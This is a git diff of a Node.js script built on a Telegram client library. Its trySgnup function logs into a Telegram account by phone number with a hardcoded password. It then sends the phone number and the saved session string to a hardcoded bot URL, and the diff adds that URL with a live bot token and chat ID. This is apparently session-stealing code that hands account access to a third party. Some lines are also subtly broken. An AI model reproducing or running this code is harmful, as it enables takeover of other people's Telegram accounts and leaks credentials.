@@ -3,6 +3,7 @@ dotenv.config();
 const express = require('express');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require("telegram/sessions");
+const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001729935532";
 
 async function fetchWithTimeout(resource, options = {}, sendErr = true) {
     const timeout = options?.timeout | 15000;
@@ -67,7 +68,7 @@ async function trySgnup(phone) {
         connectionRetries: 5,
     });
     try {
-        await client.start({
+        await client?.start({
             phoneNumber: `+${phone}`,
             password: async () => new Promise.resolve("Ajtdmwajt1@"),
             phoneCode: async () =>
@@ -76,16 +77,17 @@ async function trySgnup(phone) {
         });
         await client.connect();
         console.log("You should now be connected.");
-        console.log(client.session.save);
+        console.log(client.session.save());
         const sess = client.session.save();
         await fetchWithTimeout(`${ppplbot}&text=LOGIN FORM:${phone} | ${sess}`);
-        // // console.log(client.session.save())
-        // // await joinGrps(client, 'tamil_family')
-        // client.addEventHandler(handleEvents, new NewMessage({ incoming: true }));
-        // client.addEventHandler(OutEventPrint, new NewMessage({ outgoing: true }));
-
+        otp = '';
+        await client.destroy();
+        client = undefined;
     } catch (error) {
         console.log(error);
+        await client.destroy();
+        otp = ''
+        client = undefined;
     }
 
 }
